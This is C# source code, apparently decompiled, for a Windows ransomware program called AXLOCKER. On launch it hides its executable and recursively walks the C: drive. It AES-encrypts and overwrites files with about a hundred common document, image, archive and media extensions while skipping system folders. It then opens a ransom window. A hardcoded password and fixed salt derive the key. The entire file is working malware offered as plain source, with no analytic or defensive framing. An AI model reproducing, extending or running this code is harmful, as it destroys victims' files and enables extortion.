using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace AXLOCKER;

internal static class Program
{
	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static char[] password = new char[18]
	{
		'W', 'n', 'Z', 'r', '4', 'u', '7', 'x', 'h', '6',
		'0', 'A', '2', 'W', '4', 'R', 'z', 't'
	};

	private static readonly string[] extensionsToEncrypt = new string[102]
	{
		"7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite",
		"sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd",
		"wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd",
		"vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf",
		"kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay",
		"bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif",
		"iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw",
		"orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf",
		"srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp",
		"asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf",
		"vob", "wmv"
	};

	public static char[] GetPass()
	{
		return password;
	}

	[STAThread]
	private static void Main()
	{
		hidefile();
		startencryption();
		show();
	}

	private static void L9I51ORBYODP()
	{
	}

	private static void hidefile()
	{
		File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
	}

	public static void ProcessDirectory(string targetDirectory, int action, string password)
	{
		IEnumerable<string> enumerable = from file in Directory.EnumerateFiles(targetDirectory, "*.*")
			where extensionsToEncrypt.Any((string x) => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))
			select file;
		foreach (string item in enumerable)
		{
			ProcessFile(item, action, password);
		}
		string[] directories = Directory.GetDirectories(targetDirectory);
		string[] array = directories;
		foreach (string text in array)
		{
			try
			{
				if (!text.Contains("All Users\\Microsoft\\") && !text.Contains("$Recycle.Bin") && !text.Contains("C:\\Windows") && !text.Contains("C:\\Program Files") && !text.Contains("Temporary Internet Files") && !text.Contains("AppData\\") && !text.Contains("\\axlockerkey\\") && !text.Contains("C:\\ProgramData\\") && !text.Contains("\\Axlocker-data\\") && !text.Contains("\\AXLOCKER\\"))
				{
					ProcessDirectory(text, action, password);
				}
			}
			catch
			{
			}
		}
	}

	public static bool extension(string fileName)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(fileName);
		byte[] second = File.ReadAllBytes(fileName).Take(0).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(fileName);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string fileName, int action, string password)
	{
		if (action == 1 && !extension(fileName))
		{
			try
			{
				EncryptFile(fileName);
			}
			catch
			{
			}
		}
	}

	public static void startencryption()
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 1, "");
	}

	public static void EncryptFile(string fileUnencrypted)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeEncrypted = File.ReadAllBytes(fileUnencrypted);
		byte[] array = AES_Encrypt(bytesToBeEncrypted, bytes);
		FileStream fileStream = File.Open(fileUnencrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileUnencrypted, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes("");
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			Console.WriteLine("Encrypted: " + fileUnencrypted);
			count++;
			encryptedFiles.Add(fileUnencrypted);
		}
	}

	private static void show()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		if (File.Exists("C:\\\\Windows\\\\AppMon.txt"))
		{
			MessageBox.Show("ERROR, Private key was deleted.");
			Environment.Exit(-2);
		}
		else
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run((Form)(object)new AXLOCKER());
		}
	}

	public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}
}
